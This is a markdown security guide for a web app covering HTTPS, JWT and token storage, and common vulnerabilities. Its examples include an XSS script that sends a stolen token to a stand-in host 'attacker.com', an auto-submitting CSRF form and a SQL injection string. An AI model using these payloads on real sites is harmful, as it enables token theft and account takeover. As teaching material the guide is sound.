# Security Best Practices

Security concepts, best practices, and common vulnerabilities.

---

## Table of Contents

1. [HTTPS and SSL](#https-and-ssl)
2. [Preventing Token Interception](#preventing-token-interception)
3. [Token Storage Security](#token-storage-security)
4. [JWT Security](#jwt-security)
5. [Common Vulnerabilities](#common-vulnerabilities)
6. [Security Checklist](#security-checklist)

---

## HTTPS and SSL

### What is HTTPS?

**HTTP = Hypertext Transfer Protocol**
- Data travels in plain text
- Anyone can read it (like sending a postcard)

**HTTPS = HTTP + SSL/TLS (Secure)**
- Data is encrypted
- Only sender and receiver can read (like a sealed envelope)

### Why HTTPS is Critical

**Without HTTPS (HTTP):**
```
Frontend → [JWT travels in plain text] → Backend
           ❌ Attacker intercepts and steals JWT
```

**With HTTPS:**
```
Frontend → [Encrypted tunnel - gibberish if intercepted] → Backend
           ✅ Attacker sees: "x7f8a92bd4c..."
```

### How SSL/TLS Works

```
1. Client: "I want to connect securely"
2. Server: "Here's my SSL certificate"
3. Client: Verifies certificate is valid
4. Both: Establish encrypted connection
5. All data now encrypted
```

### Getting HTTPS

**Vercel (Frontend):**
- ✅ Auto HTTPS - nothing to do!

**AWS Lambda + API Gateway (Backend):**
- ✅ Auto HTTPS via API Gateway - nothing to do!
- All API Gateway endpoints use HTTPS by default
- No certificate management needed

**Alternative: EC2 (if not using Lambda):**
- Use **Let's Encrypt** (free SSL certificates)
- Or **AWS Certificate Manager** (ACM)

```bash
# Install Let's Encrypt on EC2 (if using EC2 instead of Lambda)
sudo apt install certbot
sudo certbot --nginx -d api.yourdomain.com
# Auto-renews every 90 days
```

---

## Preventing Token Interception

### The Threat

**Man-in-the-Middle (MITM) Attack:**
```
Your Computer → [Attacker sitting in middle] → Server
                      ↑
               Reads/steals your data
```

### Defense: HTTPS

**HTTPS prevents interception** because:
1. ✅ All data is encrypted
2. ✅ Attacker can't read encrypted data
3. ✅ Can't modify without breaking encryption

### Other Attack Vectors

**1. Malware on user's device**
- Steals token from localStorage
- **Defense:** Use httpOnly cookies (JavaScript can't access)

**2. Phishing**
- User enters credentials on fake site
- **Defense:** OAuth (user logs in on Google.com, not your site)

**3. XSS (Cross-Site Scripting)**
- Malicious JavaScript runs on your site
- Steals token from localStorage
- **Defense:** httpOnly cookies, Content Security Policy

---

## Token Storage Security

### Options and Security

| Storage | XSS Vulnerable? | CSRF Vulnerable? | Persists on Refresh? | Best For |
|---------|----------------|------------------|---------------------|----------|
| **localStorage** | ❌ Yes | ✅ No | ✅ Yes | POCs, development |
| **sessionStorage** | ❌ Yes | ✅ No | ❌ No | Single sessions |
| **Memory (state)** | ✅ No | ✅ No | ❌ No | High security |
| **httpOnly Cookie** | ✅ No | ⚠️ Yes (mitigable) | ✅ Yes | **Production** |

### XSS Attack on localStorage

```javascript
// Malicious script injected on your site
const token = localStorage.getItem('access_token');
sendToAttacker(token);  // Token stolen!
```

**Why httpOnly cookies are safer:**

```javascript
// Attacker tries to steal cookie
const token = document.cookie;  // undefined!
// JavaScript CANNOT access httpOnly cookies
```

### Using httpOnly Cookies

**Backend sets cookie:**
```python
@app.post("/auth/google")
def login(response: Response, token: str):
    # Create JWT
    jwt_token = create_jwt(user_email)

    # Set as httpOnly cookie
    response.set_cookie(
        key="access_token",
        value=jwt_token,
        httponly=True,     # JavaScript can't read
        secure=True,       # HTTPS only
        samesite="strict"  # CSRF protection
    )

    return {"message": "Logged in"}
```

**Frontend doesn't need to do anything:**
```javascript
// Cookie auto-included in requests
await fetch('/api/user');  // Cookie sent automatically
```

### Our Choice

**Phase 1 (POC):** localStorage
- Simple to implement
- Good for learning

**Phase 2+ (Production):** httpOnly cookies
- More secure
- Better protection against XSS

---

## JWT Security

### Is JWT Secure?

**YES, when used correctly!**

Major companies use JWT:
- Google, GitHub, Auth0, Netflix, Uber, Airbnb

### JWT Security Measures

**1. HTTPS (prevents interception)**
```
✅ Use HTTPS everywhere
❌ Never send JWT over HTTP
```

**2. Strong Secret Key**
```python
# Bad
SECRET_KEY = "secret"

# Good
SECRET_KEY = "kj34h5kj234h5kj23h45kj23h4kj5h23kj4h5" (32+ random chars)
```

**3. Short Expiration**
```python
# POC
exp = datetime.utcnow() + timedelta(days=1)

# Production
exp = datetime.utcnow() + timedelta(minutes=15)
```

**4. Validate Signature**
```python
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
except jwt.InvalidSignatureError:
    raise HTTPException(401, "Invalid token")
except jwt.ExpiredSignatureError:
    raise HTTPException(401, "Token expired")
```

### What if JWT is Stolen?

**Scenario:** Attacker steals JWT (malware, phishing)

**JWT approach:**
- ❌ Token valid until expiration
- ⚠️ User must wait for token to expire
- **Mitigation:** Short expiration (15 min)

**Session approach:**
- ✅ Can revoke immediately
- Admin deletes session from database

**Best of both worlds:**
- Short-lived access tokens (15 min)
- Long-lived refresh tokens (7 days)
- If stolen, only valid for 15 min

---

## Common Vulnerabilities

### 1. XSS (Cross-Site Scripting)

**Attack:**
```html
<!-- Attacker injects malicious script -->
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Defense:**
- ✅ Use httpOnly cookies
- ✅ Sanitize user input
- ✅ Content Security Policy headers
- ✅ React auto-escapes by default

### 2. CSRF (Cross-Site Request Forgery)

**Attack:**
```html
<!-- Attacker's website -->
<form action="https://yourapp.com/api/delete-account" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
<!-- If user is logged in, action executes! -->
```

**Defense:**
- ✅ SameSite cookie attribute
- ✅ CSRF tokens
- ✅ Verify Origin header

### 3. SQL Injection

**Attack:**
```python
# Bad - vulnerable
query = f"SELECT * FROM users WHERE email = '{email}'"
# Attacker sends: admin@example.com' OR '1'='1
```

**Defense:**
```python
# Good - use ORM or parameterized queries
query = "SELECT * FROM users WHERE email = ?"
cursor.execute(query, (email,))
```

### 4. Secrets in Code

**Bad:**
```python
# Committed to GitHub
GOOGLE_CLIENT_SECRET = "GOCSPX-abc123def456"
SECRET_KEY = "my-secret-key"
```

**Good:**
```python
# .env file (NOT committed)
GOOGLE_CLIENT_SECRET=GOCSPX-abc123def456
SECRET_KEY=my-secret-key

# Code
from os import getenv
SECRET_KEY = getenv("SECRET_KEY")
```

```bash
# .gitignore
.env
```

---

## Security Checklist

### Phase 1 (POC)

- [x] Use HTTPS (Vercel auto, EC2 with Let's Encrypt)
- [x] Environment variables for secrets (.env file)
- [x] JWT signed with strong secret (32+ chars)
- [x] JWT expiration (1 day for POC)
- [x] CORS configured properly
- [x] Input validation (Pydantic)
- [ ] ~~httpOnly cookies~~ (use localStorage for POC)

### Phase 2+ (Production)

- [ ] httpOnly cookies instead of localStorage
- [ ] Short-lived access tokens (15 min)
- [ ] Refresh tokens (7 days)
- [ ] Token rotation
- [ ] Rate limiting on auth endpoints
- [ ] CSRF protection (SameSite cookies)
- [ ] Security headers (CSP, HSTS, X-Frame-Options)
- [ ] Regular security audits
- [ ] Logging and monitoring
- [ ] Secrets management (AWS Secrets Manager)

### Never Do

- ❌ Never commit secrets to Git
- ❌ Never use HTTP in production
- ❌ Never trust user input without validation
- ❌ Never log sensitive data (passwords, tokens)
- ❌ Never use weak secrets ("secret", "password123")
- ❌ Never skip HTTPS for authentication
- ❌ Never store passwords in plain text

---

**This completes the learning documentation!**

Use [README.md](./README.md) to quickly find any topic.
